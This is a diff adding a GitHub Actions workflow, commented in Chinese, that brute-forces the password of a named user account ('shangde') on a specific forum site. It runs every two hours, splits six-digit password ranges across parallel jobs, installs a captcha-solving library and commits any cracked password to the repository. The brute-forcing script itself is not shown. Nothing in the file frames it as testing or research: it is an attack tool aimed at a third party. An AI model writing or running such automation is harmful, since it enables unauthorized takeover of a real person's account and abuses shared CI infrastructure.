@@ -1,0 +1,87 @@
+name: Password Cracker
+
+on:
+  workflow_dispatch:  # 手动触发
+  schedule:
+    # 每2小时运行一次（UTC时间）
+    - cron: '0 */2 * * *'
+
+env:
+  BASE_URL: "https://mk48by049.mbbs.cc"
+  TARGET_USERNAME: "shangde"
+
+jobs:
+  crack-password:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180  # 3小时超时
+    
+    strategy:
+      matrix:
+        segment: [
+          "100000-199999",
+          "200000-299999", 
+          "300000-399999",
+          "400000-499999",
+          "500000-599999",
+          "600000-699999",
+          "700000-799999",
+          "800000-899999",
+          "900000-999999"
+        ]
+    
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+      with:
+        token: ${{ secrets.GITHUB_TOKEN }}
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install requests ddddocr cairosvg
+
+    - name: Run Password Cracker
+      env:
+        PASSWORD_SEGMENT: ${{ matrix.segment }}
+      run: |
+        python boom.py
+
+    - name: Save password and commit if found
+      if: always()
+      run: |
+        # 保存日志文件
+        if [ -d "logs" ]; then
+          echo "📝 保存日志文件..."
+          git config --local user.email "action@github.com"
+          git config --local user.name "GitHub Action"
+          git add logs/
+          git commit -m "📝 更新爆破日志文件" || echo "没有新的日志文件"
+        fi
+        
+        # 保存密码文件
+        if [ -f "found_password.txt" ]; then
+          echo "🔑 发现密码文件，准备提交..."
+          git add found_password.txt
+          git commit -m "🎉 密码爆破成功 - 发现shangde账户密码 $(date +'%Y-%m-%d %H:%M:%S')"
+          git push
+          echo "✅ 密码和日志已保存并提交到仓库"
+        else
+          echo "❌ 未找到密码文件"
+          git push || echo "没有新的提交"
+        fi
+
+    - name: Upload logs artifact
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: cracker-logs-${{ matrix.segment }}
+        path: |
+          logs/
+          found_password.txt
+        retention-days: 30
+
